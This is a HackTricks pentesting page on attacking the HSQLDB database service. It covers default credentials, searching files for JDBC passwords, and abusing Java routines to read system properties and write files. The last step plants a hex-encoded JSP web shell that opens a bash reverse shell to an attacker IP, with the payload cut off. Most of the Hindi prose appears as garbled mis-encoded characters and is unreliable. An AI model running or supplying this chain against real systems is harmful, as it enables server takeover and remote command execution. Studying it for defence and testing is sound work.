{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# Basic Information

**HSQLDB \([HyperSQL DataBase](http://hsqldb.org/)\)** ‡§è‡§ï ‡§™‡•ç‡§∞‡§Æ‡•Å‡§ñ SQL ‡§∞‡§ø‡§≤‡•á‡§∂‡§®‡§≤ ‡§°‡•á‡§ü‡§æ‡§¨‡•á‡§∏ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§π‡•à ‡§ú‡•ã Java ‡§Æ‡•á‡§Ç ‡§≤‡§ø‡§ñ‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§è‡§ï ‡§õ‡•ã‡§ü‡§æ, ‡§§‡•á‡§ú ‡§Æ‡§≤‡•ç‡§ü‡•Ä‡§•‡•ç‡§∞‡•á‡§°‡•á‡§° ‡§î‡§∞ ‡§ü‡•ç‡§∞‡§æ‡§Ç‡§ú‡•à‡§ï‡•ç‡§∂‡§®‡§≤ ‡§°‡•á‡§ü‡§æ‡§¨‡•á‡§∏ ‡§á‡§Ç‡§ú‡§® ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§á‡§®-‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§î‡§∞ ‡§°‡§ø‡§∏‡•ç‡§ï-‡§Ü‡§ß‡§æ‡§∞‡§ø‡§§ ‡§ü‡•á‡§¨‡§≤ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§Ø‡§π ‡§è‡§Æ‡•ç‡§¨‡•á‡§°‡•á‡§° ‡§î‡§∞ ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§Æ‡•ã‡§° ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

**‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§™‡•ã‡§∞‡•ç‡§ü:** 9001
```text
9001/tcp open  jdbc      HSQLDB JDBC (Network Compatibility Version 2.3.4.0)
```
# Information

### Default Settings

‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Ø‡§π ‡§∏‡•á‡§µ‡§æ ‡§∏‡§Ç‡§≠‡§µ‡§§‡§É ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§ö‡§≤ ‡§∞‡§π‡•Ä ‡§π‡•à ‡§Ø‡§æ ‡§≤‡•ã‡§ï‡§≤‡§π‡•ã‡§∏‡•ç‡§ü ‡§∏‡•á ‡§¨‡§Ç‡§ß‡•Ä ‡§π‡•Å‡§à ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§®‡•á ‡§á‡§∏‡•á ‡§™‡§æ‡§Ø‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™‡§®‡•á ‡§∂‡§æ‡§Ø‡§¶ ‡§ï‡§ø‡§∏‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§∏‡•á‡§µ‡§æ ‡§ï‡§æ ‡§∂‡•ã‡§∑‡§£ ‡§ï‡§ø‡§Ø‡§æ ‡§π‡•à ‡§î‡§∞ ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§¨‡§¢‡§º‡§æ‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç‡•§

‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤ ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ `sa` ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§®‡§ï‡§æ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ñ‡§æ‡§≤‡•Ä ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§

‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§®‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§∏‡•á‡§µ‡§æ ‡§ï‡§æ ‡§∂‡•ã‡§∑‡§£ ‡§ï‡§ø‡§Ø‡§æ ‡§π‡•à, ‡§§‡•ã ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ñ‡•ã‡§ú‡•á‡§Ç‡•§
```text
grep -rP 'jdbc:hsqldb.*password.*' /path/to/search
```
Note the database name carefully - you‚Äôll need it to connect.

# Info Gathering

Connect to the DB instance by [downloading HSQLDB](https://sourceforge.net/projects/hsqldb/files/) and extracting `hsqldb/lib/hsqldb.jar`. Run the GUI app \(eww\) using `java -jar hsqldb.jar` and connect to the instance using the discovered/weak credentials.

Note the connection URL will look something like this for a remote system: `jdbc:hsqldb:hsql://ip/DBNAME`.

# Tricks

## Java Language Routines

We can call static methods of a Java class from HSQLDB using Java Language Routines. Do note that the called class needs to be in the application‚Äôs classpath.

JRTs can be `functions` or `procedures`. Functions can be called via SQL statements if the Java method returns one or more SQL-compatible primitive variables. They are invoked using the `VALUES` statement.

If the Java method we want to call returns void, we need to use a procedure invoked with the `CALL` statement.

## Reading Java System Properties

Create function:
```text
CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
```
‡§ï‡§æ‡§∞‡•ç‡§Ø‡§µ‡§æ‡§π‡•Ä ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§®:
```text
VALUES(getsystemproperty('user.name'))
```
‡§Ü‡§™ [‡§Ø‡§π‡§æ‡§Å ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§™‡•ç‡§∞‡•â‡§™‡§∞‡•ç‡§ü‡•Ä‡§ú‡§º ‡§ï‡•Ä ‡§∏‡•Ç‡§ö‡•Ä](https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html) ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

## ‡§´‡§º‡§æ‡§á‡§≤ ‡§Æ‡•á‡§Ç ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§≤‡§ø‡§ñ‡•á‡§Ç

‡§Ü‡§™ `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename` ‡§ú‡§æ‡§µ‡§æ ‡§ó‡•à‡§ú‡•á‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã JDK ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§•‡§ø‡§§ ‡§π‡•à \(‡§ú‡•ã ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§ï‡•á ‡§ï‡•ç‡§≤‡§æ‡§∏ ‡§™‡§æ‡§• ‡§Æ‡•á‡§Ç ‡§ë‡§ü‡•ã ‡§≤‡•ã‡§° ‡§π‡•ã‡§§‡§æ ‡§π‡•à\) ‡§ï‡§∏‡•ç‡§ü‡§Æ ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§°‡§ø‡§∏‡•ç‡§ï ‡§™‡§∞ ‡§π‡•á‡§ï‡•ç‡§∏-‡§ï‡•ã‡§°‡•á‡§° ‡§Ü‡§á‡§ü‡§Æ ‡§≤‡§ø‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è‡•§ **1024 ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§ï‡§æ ‡§Ö‡§ß‡§ø‡§ï‡§§‡§Æ ‡§Ü‡§ï‡§æ‡§∞ ‡§®‡•ã‡§ü ‡§ï‡§∞‡•á‡§Ç**‡•§

‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§¨‡§®‡§æ‡§è‡§Å:
```text
CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
```
‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç:
```text
call writetofile('/path/ROOT/shell.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3131392[...]' AS VARBINARY(1024)))
```
{% hint style="success" %}
‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **‡§π‡§Æ‡§æ‡§∞‡•á ‡§∏‡§æ‡§• ‡§ú‡•Å‡§°‡§º‡•á‡§Ç** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ **‡§π‡§Æ‡•á‡§Ç** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç‡•§**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
